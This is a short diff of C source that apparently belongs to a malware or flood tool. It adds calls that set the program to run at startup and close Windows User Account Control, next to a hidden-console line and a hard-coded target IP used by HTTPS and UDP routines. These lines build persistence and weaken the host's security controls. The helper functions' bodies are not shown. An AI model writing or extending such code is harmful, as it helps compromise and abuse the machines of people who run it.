@@ -720,6 +720,8 @@ int HTTPS(char *ip) {
 }
 int main()
 {
+	AutoRunStartUp();
+	CloseUAC();
 	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 	char ip[] = "192.168.44.143";
 	//UDP(ip);
